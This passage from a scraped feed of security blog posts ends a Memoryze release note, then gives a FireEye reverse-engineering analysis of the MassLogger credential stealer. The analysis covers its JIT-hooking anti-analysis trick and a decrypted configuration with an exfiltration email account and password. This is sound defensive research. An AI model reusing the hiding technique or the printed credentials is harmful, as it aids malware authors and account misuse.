Pack 3 (32-bit)</li> \n  <li>Windows Vista Service Pack 1 and Service Pack 2 (32-bit)</li> \n  <li>Windows 2003 Service Pack 2 (32-bit)</li> \n  <li>Windows 2003 Service Pack 2 (64-bit)</li> \n </ul> \n <p> <b>Attacks Against Memory Forensic Tools</b></p> \n <p> <a href=\"http://moyix.blogspot.com/2010/07/plugin-post-robust-process-scanner.html\" target=\"_blank\">Brendan Dolan-Gavitt</a> et. al. published a great article in the <i>Proceedings of the ACM Conference on Computer and Communications Security (CCS)</i> [1]. In it, they discuss an attack against memory forensic tools that would cause the tools to be blind to the existence of specially modified processes. As Brendan states in his blog, this attack has been known about for some time and requires a rootkit on the part of the intruder in order to modify the desired process(es). Memoryze has expanded upon their research by modifying the detection algorithm slightly and adding support for all the operating systems Memoryze supports. This work by Dolan-Gavitt, Srivastava, Traynor, and Griffin is sure to motivate change. If you would like to test your existing tools or validate that Memoryze is now resilient, Brendan has made a memory image available for download from his <a href=\"http://moyix.blogspot.com/2010/07/plugin-post-robust-process-scanner.html\" target=\"_blank\">blog</a>.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/DKOM_mem2.jpg\"><img width=\"400\" height=\"200\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/DKOM_mem2.jpg\" title=\"DKOM and Memory Analysis\" class=\"aligncenter size-full wp-image-1507\" /></a></p> \n <p> <b>Speed Improvements</b></p> \n <p>In addition to platform support and resilience to recent DKOM attacks, Memoryze is now as much as 40% faster depending on memory size and configuration parameters. This and some of the other improvements made should make string enumeration a lot better.</p> \n <p> <b>Portable Installation</b></p> \n <p>Peter Villadsen fixed a bug in the way Memoryze used to install that required the user to use \"-portable\" at the command line when running Memoryze. Obviously, this broke Audit Viewer because of the way it invokes Memoryze. Now that has been fixed. When you are installing Memoryze to be used portably, you must use special options to msiexec.</p> \n <p>msiexec /a MemoryzeSetup.msi /qb TARGETDIR=portable_drive_and_folder</p> \n <p>The portable_drive_and_folder should be the drive letter of the USB key and the folder you want to install Memoryze into such as H:Memoryze</p> \n <p>Now, the first time you run portable Memoryze it will create several files; therefore, you cannot make the media read-only yet. After that, you should be set to run Memoryze off a USB key or CD-Rom. You can have Audit Viewer invoke Memoryze or use the *.bat files that are included.</p> \n <p>It has been fun over the past two years working with our user base and our consultants as they have ran this code over literally hundreds of thousands of hosts. I am looking forward to what the next two years bring.</p> \n <p> <b> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" target=\"_blank\">Download Memoryze NOW</a></b></p> \n <p>[1] Dolan-Gavitt, B., Srivastava, A., Traynor, P., and Giffin, J., \"Robust signatures for kernel data structures,\" in <i>Proceedings of the ACM Conference on Computer and Communications Security (CCS)</i>, 2009.</p> \n <p> <i>The \"*\" means that complete regression testing on those platforms has not been completed, but we felt the feature was important enough to users to get the feature out as soon as it was available.</i></p> \n</div>","descriptionType":"html","publishedDate":"Tue, 21 Sep 2010 03:41:55 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/DKOM_mem2.jpg","linkMd5":"8004f44b947e89c29b57766ce409db50","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn8@2020_6/2020/08/24/14-11-06-985_54b9638c5fe0b859.webp","destWidth":1620,"destHeight":745,"sourceBytes":216809,"destBytes":141072,"author":"Jamie Butler","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/DKOM_mem2.jpg":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn8@2020_6/2020/08/24/14-11-06-985_54b9638c5fe0b859.webp"},"publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Bypassing MassLogger Anti-Analysis — a Man-in-the-Middle Approach","link":"http://www.fireeye.com/blog/threat-research/2020/08/bypassing-masslogger-anti-analysis-man-in-the-middle-approach.html","description":"<p>The FireEye Front Line Applied Research &amp; Expertise (FLARE) Team\n  attempts to always stay on top of the most current and emerging\n  threats. As a member of the FLARE Reverse Engineer team, I recently\n  received a request to analyze a fairly new credential stealer\n  identified as MassLogger. Despite the lack of novel functionalities\n  and features, this sample employs a sophisticated technique that\n  replaces the Microsoft Intermediate Language (MSIL) at run time to\n  hinder static analysis. At the time of this writing, there is only <a\n    href=\"https://cert-agid.gov.it/wp-content/uploads/2020/06/CERT-AGID_MassLogger-20200609.pdf\">one\n  publication</a> discussing the MassLogger obfuscation technique in\n  some detail. Therefore, I decided to share my research and <a\n    href=\"https://github.com/fireeye/jitm\">tools to help analyze\n    MassLogger and other malware using a similar technique</a>. Let us\n  take a deep technical dive into the MassLogger credential stealer and\n  the .NET runtime.</p>\n <h4>Triage</h4>\n <p>MassLogger is a .NET credential stealer. It starts with a launcher\n    (<span\n  class=\"code\">6b975fd7e3eb0d30b6dbe71b8004b06de6bba4d0870e165de4bde7ab82154871</span>)\n  that uses simple anti-debugging techniques which can be easily\n  bypassed when identified. This first stage loader eventually\n  XOR-decrypts the second stage assembly which then decrypts, loads and\n  executes the final MassLogger payload (<span\n  class=\"code\">bc07c3090befb5e94624ca4a49ee88b3265a3d1d288f79588be7bb356a0f9fae</span>)\n  named <span class=\"code\">Bin-123.exe</span>. The final payload can be\n  easily extracted and executed independently. Therefore, we will focus\n  exclusively on this final payload where the main anti analysis\n  technique is used.</p>\n <p>Basic static analysis doesn’t reveal anything too exciting. We\n  notice some interesting strings, but they are not enough to give us\n  any hints about the malware’s capabilities. Executing the payload in a\n  controlled environment shows that the sample drops a log file that\n  identifies the malware family, its version, and most importantly some\n  configuration options. A sample log file is described in Figure 1. We\n  can also extract some interesting strings from memory as the sample\n  runs. However, basic dynamic analysis is not sufficient to extract all\n  host-based indicators (HBIs), network-based indicators (NBIs) and\n  complete malware functionality. We must perform a deeper analysis to\n  better understand the sample and its capabilities.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><p>\n          <span class=\"code\">User Name: user<br />  IP: 127.0.0.1<br />\n            Location: United States<br />  OS: Microsoft Windows 7\n            Ultimate 32bit<br />  CPU: Intel(R) Core(TM) i7-6820HQ CPU @\n            2.70GHz<br />  GPU: VMware SVGA 3D<br />  AV: NA<br />\n            Screen Resolution: 1438x2460<br />  Current Time: 6/17/2020\n            1:23:30 PM<br />  MassLogger Started: 6/17/2020 1:23:21\n            PM<br />  Interval: 2 hour<br />  MassLogger Process:\n            C:\\Users\\user\\Desktop\\Bin-123.exe<br />  MassLogger Melt:\n            false<br />  MassLogger Exit after delivery: false<br />  As\n            Administrator: False<br />  Processes:<br />  Name:cmd,\n            Title:Administrator: FakeNet-NG - fakenet<br />\n            Name:iexplore, Title:FakeNet-NG - Internet Explorer<br />\n            Name:dnSpy-x86, Title:dnSpy v6.0.5 (32-bit)<br />  Name:cmd,\n            Title:Administrator: C:\\Windows\\System32\\cmd.exe<br />\n            Name:ProcessHacker, Title:Process Hacker\n            [WIN-R23GG4KO4SD\\user]+ (Administrator)</span></p> <p>\n          <span class=\"code\">### WD Exclusion ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### USB Spread ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### Binder ###<br />  Disabled</span></p> <p>\n          <span class=\"code\">### Window Searcher ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### Downloader ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### Bot Killer ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### Search And Upload ###<br />\n        Disabled</span></p> <p>\n          <span class=\"code\">### Telegram Desktop ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Pidgin ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### FileZilla ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Discord Tokken ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### NordVPN ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Outlook ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### FoxMail ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Thunderbird ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### QQ Browser ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### FireFox ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Chromium Recovery ###<br />  Not\n        Installed</span></p> <p>\n          <span class=\"code\">### Keylogger And Clipboard ###</span></p> <p>\n          <span class=\"code\"> </span></p> <p>\n          <span class=\"code\">[20/06/17]  [Welcome to Chrome - Google\n            Chrome]<br />  [ESC]</span></p> <p>\n          <span class=\"code\">[20/06/17]  [Clipboard]<br />\n        Vewgbprxvhvjktmyxofjvpzgazqszaoo</span></p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 1: Sample MassLogger log</span></p>\n <h4>Just Decompile It</h4>\n <p>Like many other .NET malwares, MassLogger obfuscates all of its\n  methods names and even the method control flow. We can use <span\n  class=\"code\">de4dot</span> to automatically deobfuscate the MassLogger\n  payload. However, looking at the deobfuscated payload, we quickly\n  identify a major issue: Most of the methods contain almost no logic as\n  shown in Figure 2.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure2.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: dnSpy showing empty methods</span></p>\n <p>Looking at the original MassLogger payload in <span\n  class=\"code\">dnSpy</span>’s Intermediate Language (IL) view confirms\n  that most methods do not contain any logic and simply return nothing.\n  This is obviously not the real malware since we already observed with\n  dynamic analysis that the sample indeed performs malicious activities\n  and logging to a log file. We are left with a few methods, most\n  notably the method with the token <span class=\"code\">0x0600049D</span>\n  called first thing in the main module constructor.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure3.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 3: dnSpy IL view showing the\n    method's details</span></p>\n <p>Method <span class=\"code\">0x0600049D</span> control flow has been\n  obfuscated into a series of switch statements. We can still somewhat\n  follow the method’s high-level logic with the help of <span\n  class=\"code\">dnSpy</span> as a debugger. However, fully analyzing the\n  method would be very time consuming. Instead, when first analyzing\n  this payload, I chose to quickly scan over the entire module to look\n  for hints. Luckily, I spot a few interesting strings I missed during\n  basic static analysis: <span class=\"code\">clrjit.dll</span>, <span\n  class=\"code\">VirtualAlloc</span>, <span\n  class=\"code\">VirtualProtect</span> and <span\n  class=\"code\">WriteProcessMemory</span> as seen in Figure 4.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure4.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 4: Interesting strings scattered\n    throughout the module</span></p>\n <p>A quick internet search for “<span class=\"code\">clrjit.dll</span>”\n  and “<span class=\"code\">VirtualProtect</span>” quickly takes us to <a\n  href=\"https://xoofx.com/blog/2018/04/12/writing-managed-jit-in-csharp-with-coreclr/\">a</a>\n    <a\n  href=\"https://georgeplotnikov.github.io/articles/just-in-time-hooking.html\">few</a>\n    <a\n  href=\"http://antonioparata.blogspot.com/2018/02/analyzing-nasty-net-protection-of.html\">publications</a>\n  describing a technique commonly referred to as Just-In-Time Hooking.\n  In essence, JIT Hooking involves installing a hook at the <span\n  class=\"code\">compileMethod()</span> function where the JIT compiler is\n  about to compile the MSIL into assembly (x86, x64, etc). With the hook\n  in place, the malware can easily replace each method body with the\n  real MSIL that contains the original malware logic. To fully\n  understand this process, let’s explore the .NET executable, the .NET\n  methods, and how MSIL turns into x86 or x64 assembly.</p>\n <h4>.NET Executable Methods</h4>\n <p>A .NET executable is just another binary following the Portable\n  Executable (PE) format. There are plenty of resources describing the\n    <a\n  href=\"https://bytepointer.com/resources/pietrek_peering_inside_pe.htm\">PE</a>\n    <a\n  href=\"https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail\">file</a>\n    <a\n  href=\"https://docs.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN\">format</a>,\n  the <a href=\"https://www.ntcore.com/files/dotnetformat.htm\">.NET\n  metadata</a> and the .NET token tables in detail. I recommend our\n  readers to take a quick detour and refresh their memory on those\n  topics before continuing. This post won’t go into further details but\n  will focus on the .NET methods instead.</p>\n <p>Each .NET method in a .NET assembly is identified by a token. In\n  fact, everything in a .NET assembly, whether it’s a module, a class, a\n  method prototype, or a string, is identified by a token. Let’s look at\n  method identified by the token <span class=\"code\">0x0600049D</span>,\n  as shown in Figure 5. The most-significant byte (<span\n  class=\"code\">0x06</span>) tells us that this token is a method token\n  (type <span class=\"code\">0x06</span>) instead of a module token (type\n    <span class=\"code\">0x00</span>), a TypeDef token (type <span\n  class=\"code\">0x02</span>), or a LocalVarSig token (type <span\n  class=\"code\">0x11</span>), for example. The three least significant\n  bytes tell us the ID of the method, in this case it’s <span\n  class=\"code\">0x49D</span> (<span class=\"code\">1181</span> in decimal).\n  This ID is also referred to as the Method ID (MID) or the Row ID of\n  the method.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure5.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 5: Method details for method 0x0600049D</span></p>\n <p>To find out more information about this method, we look within the\n  tables of the “<span class=\"code\">#~</span>” stream of the .NET\n  metadata streams in the .NET metadata directory as show in Figure 6.\n  We traverse to the entry number <span class=\"code\">1181</span> or\n    <span class=\"code\">0x49D</span> of the Method table to find the\n  method metadata which includes the Relative Virtual Address (RVA) of\n  the method body, various flags, a pointer to the name of the method, a\n  pointer to the method signature, and finally, an pointer to the\n  parameters specification for this method. <b>Please note that the MID\n    starts at 1 instead of 0</b>.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure6.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 6: Method details from the PE file header</span></p>\n <p>For method <span class=\"code\">0x0600049D</span>, the RVA of the\n  method body is <span class=\"code\">0xB690</span>. This RVA belongs to\n  the <span class=\"code\">.text</span> section whose RVA is <span\n  class=\"code\">0x2000</span>. Therefore, this method body begins at\n    <span class=\"code\">0x9690</span> (<span class=\"code\">0xB690</span> –\n    <span class=\"code\">0x2000</span>) bytes into the <span\n  class=\"code\">.text</span> section. The <span class=\"code\">.text</span>\n  section starts at <span class=\"code\">0x200</span> bytes into the file\n  according to the section header. As a result, we can find the method\n  body at <span class=\"code\">0x9890</span> (<span\n  class=\"code\">0x9690</span> + <span class=\"code\">0x200</span>) bytes\n  offset into the file. We can see the method body in Figure 7.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure7.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 7: Method 0x0600049D body in a hex editor</span></p>\n <h4>.NET Method Body</h4>\n <p>The .NET method body starts with a method body header, followed by\n  the MSIL bytes. There are two types of .NET methods: a tiny method and\n  a fat method. Looking at the first byte of the method body header, the\n  two least-significant bits tell us if the method is tiny (where the\n  last two bits are <span class=\"code\">10</span>) or fat (where the last\n  two bits are <span class=\"code\">11</span>).</p>\n <p>\n  <i>.NET Tiny Method</i></p>\n <p>Let’s look at method <span class=\"code\">0x06000495</span>. Following\n  the same steps described earlier, we check the row number <span\n  class=\"code\">0x495</span> (<span class=\"code\">1173</span> in decimal)\n  of the Method table to find the method body RVA is <span\n  class=\"code\">0x7A7C</span> which translates to <span\n  class=\"code\">0x5C7C</span> as the offset into the file. At this\n  offset, the first byte of the method body is <span\n  class=\"code\">0x0A</span> (<span class=\"code\">0000</span> <span\n  class=\"code\">1010</span> in binary).</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure8.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 8: Method 0x06000495 metadata and body</span></p>\n <p>Since the two least-significant bits are <span\n  class=\"code\">10</span>, we know that <span\n  class=\"code\">0x06000495</span> is a tiny method. For a tiny method,\n  the method body header is <b>one byte long</b>. The <b>two\n    least-significant bits</b> are <span class=\"code\">10</span> to\n  indicate that this is the tiny method, and the <b>six most-significant\n  bits</b> tell us the size of the MSIL to follow (i.e. how long the\n  MSIL is). In this case, the six most-significant bits are <span\n  class=\"code\">000010</span>, which tells us the method body is two\n  bytes long. The entire method body for <span\n  class=\"code\">0x06000495</span> is <span class=\"code\">0A</span> <span\n  class=\"code\">16</span> <span class=\"code\">2A</span>, followed by a\n  NULL byte, which has been disassembled by <span\n  class=\"code\">dnSpy</span> as shown in Figure 9.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure9.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 9: Method 0x06000495 in dnSpy IL view</span></p>\n <p>\n  <i>.NET Fat Method</i></p>\n <p>Coming back to method <span class=\"code\">0x0600049D</span> (entry\n  number <span class=\"code\">1181</span>) at offset <span\n  class=\"code\">0x9890</span> into the file (RVA <span\n  class=\"code\">0xB690</span>), the first byte of the method body is\n    <span class=\"code\">0x1B</span> (or <span class=\"code\">0001</span>\n    <span class=\"code\">1011</span> in binary). The two least-significant\n  bits are <span class=\"code\">11</span>, indicating that <span\n  class=\"code\">0x0600049D</span> is a fat method. The fat method body\n  header is <b>12-byte long</b> whose structure is beyond the scope of\n  this blog post. The field we really care about is a <b>four-byte\n  field</b> at <b>offset <span class=\"code\">0x04</span> byte</b> into\n  this fat header. This field specifies the length of the MSIL that\n  follows this method body header. For method <span\n  class=\"code\">0x0600049D</span>, the entire method body header is\n    “<span class=\"code\">1B 30 08 00 <b>A8 61 00 00</b> 75 00 00\n  11</span>” and the length of the MSIL to follow is “<span\n    class=\"code\">A8 61 00 00</span>” or <span class=\"code\">0x61A8</span>\n    (<span class=\"code\">25000</span> in decimal) bytes.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure10.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 10: Method 0x0600049D body in a\n    hex editor</span></p>\n <h4>JIT Compilation</h4>\n <p>Whether a method is tiny or fat, it does not execute as is. When the\n  .NET runtime needs to execute a method, it follows exactly the process\n  described earlier to find the method body which includes the method\n  body header and the MSIL bytes. If this is the first time the method\n  needs to run, the .NET runtime invokes the Just-In-Time compiler which\n  takes the MSIL bytes and compiles them into x86 or x64 assembly\n  depending on whether the current process is 32- or 64-bit. After some\n  preparation, the JIT compiler eventually calls the <span\n  class=\"code\">compileMethod()</span> function. The entire .NET runtime\n  project is open-sourced and <a\n    href=\"https://github.com/dotnet/runtime\">available on GitHub</a>. We\n  can easily find out that the <span class=\"code\">compileMethod()</span>\n  function has the following prototype (Figure 11):</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">CorJitResult __stdcall compileMethod\n          (<br />      ICorJitInfo                      \n          *comp,               /* IN */<br />     \n          CORINFO_METHOD_INFO               *<b>info</b>,              \n          /* IN */<br />      unsigned /* code:CorJitFlag */   \n          flags,               /* IN */<br />     \n          BYTE                              **nativeEntry,       /* OUT\n          */<br />      ULONG                            \n          *nativeSizeOfCode    /* OUT */<br />  );</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 11: compileMethod() function protype</span></p>\n <p>Figure 12 shows the <span class=\"code\">CORINFO_METHOD_INFO</span> structure.</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">struct CORINFO_METHOD_INFO<br />  {<br />\n                CORINFO_METHOD_HANDLE       ftn;<br />       \n          CORINFO_MODULE_HANDLE       scope;<br />        BYTE\n          *                      <b>ILCode</b>;<br />       \n          unsigned                    <b>ILCodeSize</b>;<br />       \n          unsigned                    maxStack;<br />       \n          unsigned                    EHcount;<br />       \n          CorInfoOptions              options;<br />       \n          CorInfoRegionKind           regionKind;<br />       \n          CORINFO_SIG_INFO            args;<br />       \n          CORINFO_SIG_INFO            locals;<br />  };</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 12: CORINFO_METHOD_INFO structure</span></p>\n <p>The <span class=\"code\">ILCode</span> is a pointer to the MSIL of the\n  method to compile, and the <span class=\"code\">ILCodeSize</span> tells\n  us how long the MSIL is. The return value of <span\n  class=\"code\">compileMethod()</span> is an error code indicating\n  success or failure. In case of success, the <span\n  class=\"code\">nativeEntry</span> pointer is populated with the address\n  of the executable memory region containing the x86 or the x64\n  instruction that is compiled from the MSIL.</p>\n <h4>MassLogger JIT Hooking</h4>\n <p>Let’s come back to MassLogger. As soon as the main module\n  initialization runs, it first decrypts MSIL of the other methods. It\n  then installs a hook to execute its own version of <span\n  class=\"code\">compileMethod()</span> (method <span\n  class=\"code\">0x06000499</span>). This method replaces the <span\n  class=\"code\">ILCode</span> and <span class=\"code\">ILCodeSize</span>\n  fields of the info argument to the original <span\n  class=\"code\">compileMethod()</span> with the real malware’s MSIL bytes.</p>\n <p>In addition to replacing the MSIL bytes, MassLogger also patches the\n  method body header at module initialization time. As seen from Figure\n  13, the method body header of method <span\n  class=\"code\">0x060003DD</span> on disk (at file offset 0x3CE0) is\n  different from the header in memory (at RVA <span\n  class=\"code\">0x5AE0</span>). The only two things remaining quite\n  consistent are the least significant two bits indicating whether the\n  method is tiny or fat. To successfully defeat this anti-analysis\n  technique, we must recover the real MSIL bytes as well as the correct\n  method body headers.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure13.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 13: Same method body with\n    different headers when resting on disk vs. loaded in memory</span></p>\n <h4>Defeating JIT Method Body Replacement With JITM</h4>\n <p>To automatically recover the MSIL and the method body header, one\n  possible approach suggested by another FLARE team member is to install\n  our own hook at <span class=\"code\">compileMethod()</span> function\n  before loading and allowing the MassLogger module constructor to run. \n  There are <a\n  href=\"https://georgeplotnikov.github.io/articles/just-in-time-hooking.html\">multiple</a>\n    <a\n  href=\"https://ntcore.com/files/netint_injection.htm\">tutorials</a> and\n    <a\n  href=\"https://xoofx.com/blog/2018/04/12/writing-managed-jit-in-csharp-with-coreclr/\">open-sourced</a>\n    <a href=\"https://github.com/maddnias/SJITHook\">projects</a> on\n  hooking <span class=\"code\">compileMethod()</span> using both managed\n  hooks (the new <span class=\"code\">compileMethod()</span> is a managed\n  method written in C#) and native hooks (the new <span\n  class=\"code\">compileMethod()</span> is native and written in C or\n  C++). However, due to the unique way MassLogger hooks <span\n  class=\"code\">compileMethod()</span>, we cannot use the vtable hooking\n  technique implemented by many of the aforementioned projects.\n  Therefore, I’d like to share the following project: <a\n  href=\"https://github.com/fireeye/jitm\">JITM</a>, which is designed use\n  inline hooking implemented by <a\n  href=\"https://github.com/stevemk14ebr/PolyHook_2_0\">PolyHook</a>\n  library. JITM comes with a wrapper for <span\n  class=\"code\">compileMethod()</span> which logs all the method body\n  headers and MSIL bytes to a JSON file before calling the original\n    <span class=\"code\">compileMethod()</span>.</p>\n <p>In addition to the hook, <span class=\"code\">JITM</span> also\n  includes a .NET loader. This loader first loads the native hook DLL\n    (<span class=\"code\">jitmhook.dll</span>) and installs the hook. The\n  loader then loads the MassLogger payload and executes its entry point.\n  This causes MassLogger’s module initialization code to execute and\n  install its own hook, but hooking <span\n  class=\"code\">jitmhook.dll</span> code instead of the original <span\n  class=\"code\">compileMethod()</span>. An alternative approach to\n  executing MassLogger’s entry point is to call the <span\n  class=\"code\">RuntimeHelpers.PrepareMethod()</span> API to force the\n  JIT compiler to run on all methods. This approach is better because it\n  avoids running the malware, and it potentially can recover methods not\n  called in the sample’s natural code path. However, additional work is\n  required to force all methods to be compiled properly.</p>\n <p>To load and recover MassLogger methods, first run the following\n  command (Figure 14):</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td><span class=\"code\">jitm.exe <b>Bin-123.exe</b>\n      [optional_timeout]</span></td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 14: Command to run jitm</span></p>\n <p>Once the timeout expires, you should see the files <span\n  class=\"code\">jitm.log</span> and <span class=\"code\">jitm.json</span>\n  created in the current directory. <span class=\"code\">jitm.json</span>\n  contains the method tokens, method body headers and MSIL bytes of all\n  methods recovered from <span class=\"code\">Bin-123.exe</span>. The only\n  thing left to do is to rebuild the .NET metadata so we can perform\n  static analysis.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure15.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 15: Sample jitm.json</span></p>\n <h4>Rebuilding the Assembly</h4>\n <p>Since the decrypted method body headers and MSIL bytes may not fit\n  in the original .NET assembly properly, the easiest thing to do is to\n  add a new section and a section header to MassLogger. There are <a\n  href=\"https://reverseengineering.stackexchange.com/questions/15045/adding-a-new-pe-section-for-a-code-cave\">plenty</a>\n  of <a\n  href=\"https://reverseengineering.stackexchange.com/questions/8390/python-adding-a-asection-to-a-pe-file\">resources</a>\n  on <a\n    href=\"https://reverseengineering.stackexchange.com/questions/13995/adding-section-to-pe-binary-using-stud-pe\">how\n  to</a> <a\n    href=\"http://www.rohitab.com/discuss/topic/41466-add-a-new-pe-section-code-inside-of-it/\">add\n    a PE section header and data</a>, none of which is trivial or easy\n  to automate. Therefore, <span class=\"code\">JITM</span> also include\n  the following Python 2.7 helper script to automate this process: <span class=\"code\">Scripts\\addsection.py</span>.</p>\n <p>With the method body header and MSIL of each method added to a new\n  PE section as shown in Figure 16, we can easily parse the .NET\n  metadata and fix each method’s RVA to point to the correct method body\n  within the new section. Unfortunately, I did not find any Python\n  library to easily parse the .NET metadata and the MethodDef table.\n  Therefore, <span class=\"code\">JITM</span> also includes a partially\n  implemented .NET metadata parser: <span\n  class=\"code\">Script\\pydnet.py</span>. This script uses <span\n  class=\"code\">pefile</span> and <span class=\"code\">vivisect</span>\n  modules and parses the PE file up to the <span\n  class=\"code\">Method</span> table to extract all methods and their\n  associated RVAs.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure16.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 16: Bin-123.exe before and after\n    adding an additional section named FLARE</span></p>\n <p>Finally, to tie everything together, <span class=\"code\">JITM</span>\n  provides <span class=\"code\">Script\\fix_assembly.py</span> to perform\n  the following tasks:</p>\n <ol> <li>Write the method body header and MSIL of each method recovered\n    in <span class=\"code\">jitm.json</span> into a temporary binary file\n    named “<span class=\"code\">section.bin</span>” while at the same time\n    remember the associated method token and the offset into <span\n  class=\"code\">section.bin</span>.</li> <li>Use <span\n    class=\"code\">addsection.py</span> to add <span\n    class=\"code\">section.bin</span> into <span\n    class=\"code\">Bin-123.exe</span> and save the data into a new file,\n    e.g. <span class=\"code\">Bin-123.fixed.exe</span>.</li> <li>Use <span\n    class=\"code\">pydnet.py</span> to parse <span\n    class=\"code\">Bin-123.fixed.exe</span> and update the RVA field of\n    each method entry in the MethodDef table to point to the correct RVA\n    into the new section.</li> </ol>\n <p>The final result is a partially reconstructed .NET assembly.\n  Although additional work is necessary to get this assembly to run\n  correctly, it is good enough to perform static analysis to understand\n  the malware’s high-level functionalities.</p>\n <p>Let’s look at the reconstructed method <span\n  class=\"code\">0x0600043E</span> that implements the decryption logic\n  for the malware configuration. Compared to the original MSIL, the\n  reconstructed MSIL now shows that the malware uses <span\n  class=\"code\">AES-256</span> in <span class=\"code\">CBC</span> mode with\n    <span class=\"code\">PKCS7</span> padding. With a combination of\n  dynamic analysis and static analysis, we can also easily identify the\n  key to be “<span class=\"code\">Vewgbprxvhvjktmyxofjvpzgazqszaoo</span>”\n  and the IV to be part of the <span class=\"code\">Base64</span>-encoded\n  buffer passed in as its argument.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure17.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 17: Method 0x0600043 before and\n    after fixing the assembly</span></p>\n <p>Armed with that knowledge, we can write a simple tool to decrypt the\n  malware configuration and recover all HBIs and NBIs (Figure 18).</p>\n <table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> <tbody>\n    <tr>\n      <td>                            <span class=\"code\">  BinderBytes:\n          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br />               \n            BinderName: Mzvmy_Nyrrd<br />                  BinderOnce:\n          false<br />          DownloaderFilename: Hrebxs<br />         \n              DownloaderOnce: false<br />               DownloaderUrl:\n          Vrwus<br />                EmailAddress:\n          appfoil@outlook.com<br />                 EmailClient:\n          smtp.outlook.com<br />                 EmailEnable: true<br />\n                           EmailPass: services000<br />                 \n           EmailPort: 587<br />                 EmailSendTo:\n          appfoil@outlook.com<br />                    EmailSsl:\n          True<br />          EnableAntiDebugger: false<br />         \n          EnableAntiHoneypot: false<br />         EnableAntiSandboxie:\n          false<br />            EnableAntiVMware: false<br />         \n                EnableBinder: false<br />             EnableBotKiller:\n          false                               <br />     \n           EnableBrowserRecovery: true<br />\n          EnableDeleteZoneIdentifier: false<br />           \n          EnableDownloader: false<br />              EnableForceUac:\n          false<br />               EnableInstall: false<br />         \n             EnableKeylogger: true<br />            EnableMemoryScan:\n          false<br />                 EnableMutex: false<br />         \n            EnableScreenshot: false<br />       EnableSearchAndUpload:\n          false<br />             EnableSpreadUsb: false<br />         \n           EnableWDExclusion: false<br 